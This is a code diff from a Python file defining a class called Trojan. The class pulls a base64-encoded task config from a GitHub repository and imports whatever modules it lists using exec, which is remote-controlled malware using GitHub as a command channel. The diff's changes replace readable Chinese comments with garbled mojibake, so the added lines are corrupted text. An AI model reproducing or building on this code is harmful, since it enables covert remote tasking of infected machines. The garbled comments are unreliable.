@@ -20,7 +20,7 @@ def github_connect():
 
 
 def get_file_contents(dirname,module_name,repo):
-    #从远程仓库抓取文件
+    #锟斤拷远锟教仓匡拷抓取锟侥硷拷
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
@@ -31,17 +31,17 @@ class Trojan:
         self.repo=github_connect()
 
 
-    #得到一个config文件下的json的实例对象
+    #锟矫碉拷一锟斤拷config锟侥硷拷锟铰碉拷json锟斤拷实锟斤拷锟斤拷锟斤拷
     def get_config(self):
         config_json=get_file_contents(
             'config',self.config_file,self.repo
         )
 
-        #将json转换为python对象
+        #锟斤拷json转锟斤拷为python锟斤拷锟斤拷
         config=json.loads(base64.b64decode(config_json))
 
         for task in config:
-            if task['module'] not in sys.modules:           #如果此模块未被导入，则导入此模块
+            if task['module'] not in sys.modules:           #锟斤拷锟斤拷锟侥ｏ拷锟轿达拷锟斤拷锟斤拷耄拷锟斤拷锟斤拷模锟斤拷
                 exec("import %s"% task['module'])
         return config
     
